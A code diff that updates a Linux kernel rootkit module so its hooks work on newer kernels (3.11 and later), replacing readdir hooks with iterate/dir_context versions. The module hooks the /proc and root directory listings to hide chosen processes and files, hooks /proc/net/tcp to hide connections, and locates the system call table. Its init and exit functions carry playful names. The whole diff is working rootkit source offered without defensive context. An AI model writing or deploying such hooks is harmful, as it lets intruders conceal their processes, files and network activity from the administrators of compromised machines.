@@ -16,10 +16,30 @@ static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
 static int (*udp4_seq_show)(struct seq_file *seq, void *v);
 static int (*udp6_seq_show)(struct seq_file *seq, void *v);
-static int (*o_proc_readdir)(struct file *file, void *dirent, filldir_t filldir);
-static int (*root_readdir)(struct file *file, void *dirent, filldir_t filldir);
-static int (*o_proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
-static int (*o_root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
+static int (*proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
+static int (*root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,11,0)
+static int (*proc_iterate)(struct file *file, struct dir_context *);
+static int (*root_iterate)(struct file *file, struct dir_context *);
+#define ITERATE_NAME iterate
+#define ITERATE_PROTO struct file *file, struct dir_context *ctx
+#define FILLDIR_VAR ctx->actor
+#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC)\
+{\
+    *((filldir_t*) &ctx->actor) = &FILLDIR_FUNC;\
+    ret = ITERATE_FUNC(file, ctx);\
+}
+#else
+static int (*proc_iterate)(struct file *file, void *dirent, filldir_t filldir);
+static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
+#define ITERATE_NAME readdir
+#define ITERATE_PROTO struct file *file, void *dirent, filldir_t filldir
+#define FILLDIR_VAR filldir
+#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC)\
+{\
+    ret = ITERATE_FUNC(file, dirent, &FILLDIR_FUNC);\
+}
+#endif
 
 unsigned long *sys_call_table;
 unsigned long *ia32_sys_call_table;
@@ -188,7 +208,7 @@ void *get_inet_ioctl ( int family, int type, int protocol )
     return ret;
 }
 
-void *get_vfs_readdir ( const char *path )
+void *get_vfs_iterate ( const char *path )
 {
     void *ret;
     struct file *filep;
@@ -196,7 +216,7 @@ void *get_vfs_readdir ( const char *path )
     if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
         return NULL;
 
-    ret = filep->f_op->readdir;
+    ret = filep->f_op->ITERATE_NAME;
 
     filp_close(filep, 0);
 
@@ -525,21 +545,21 @@ static int n_root_filldir( void *__buf, const char *name, int namelen, loff_t of
         if ( ! strcmp(name, hf->name) )
             return 0;
 
-    return o_root_filldir(__buf, name, namelen, offset, ino, d_type);
+    return root_filldir(__buf, name, namelen, offset, ino, d_type);
 }
 
-int n_root_readdir ( struct file *file, void *dirent, filldir_t filldir )
+int n_root_iterate(ITERATE_PROTO)
 {
     int ret;
 
     if ( ! file || ! file->f_path.mnt ) // XXX is this necessary?
         return 0;
 
-    o_root_filldir = filldir;
+    root_filldir = FILLDIR_VAR;
 
-    hijack_pause(root_readdir);
-    ret = root_readdir(file, dirent, &n_root_filldir);
-    hijack_resume(root_readdir);
+    hijack_pause(root_iterate);
+    REPLACE_FILLDIR(root_iterate, n_root_filldir);
+    hijack_resume(root_iterate);
 
     return ret;
 }
@@ -556,18 +576,18 @@ static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t of
         if ( pid == hp->pid )
             return 0;
 
-    return o_proc_filldir(__buf, name, namelen, offset, ino, d_type);
+    return proc_filldir(__buf, name, namelen, offset, ino, d_type);
 }
 
-int n_proc_readdir ( struct file *file, void *dirent, filldir_t filldir )
+int n_proc_iterate(ITERATE_PROTO)
 {
     int ret;
 
-    o_proc_filldir = filldir;
+    proc_filldir = FILLDIR_VAR;
 
-    hijack_pause(o_proc_readdir);
-    ret = o_proc_readdir(file, dirent, &n_proc_filldir);
-    hijack_resume(o_proc_readdir);
+    hijack_pause(proc_iterate);
+    REPLACE_FILLDIR(proc_iterate, n_proc_filldir);
+    hijack_resume(proc_iterate);
 
     return ret;
 }
@@ -877,12 +897,12 @@ static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
     DEBUG("sys_call_table obtained at %p\n", sys_call_table);
 
     /* Hook /proc for hiding processes */
-    o_proc_readdir = get_vfs_readdir("/proc");
-    hijack_start(o_proc_readdir, &n_proc_readdir);
+    proc_iterate = get_vfs_iterate("/proc");
+    hijack_start(proc_iterate, &n_proc_iterate);
 
     /* Hook / for hiding files and directories */
-    root_readdir = get_vfs_readdir("/");
-    hijack_start(root_readdir, &n_root_readdir);
+    root_iterate = get_vfs_iterate("/");
+    hijack_start(root_iterate, &n_root_iterate);
 
     /* Hook /proc/net/tcp for hiding tcp4 connections */
     tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
@@ -950,8 +970,8 @@ static void __exit mischief_managed ( void )
     hijack_stop(udp4_seq_show);
     hijack_stop(tcp6_seq_show);
     hijack_stop(tcp4_seq_show);
-    hijack_stop(root_readdir);
-    hijack_stop(o_proc_readdir);
+    hijack_stop(root_iterate);
+    hijack_stop(proc_iterate);
 }
 
 module_init(i_solemnly_swear_that_i_am_up_to_no_good);
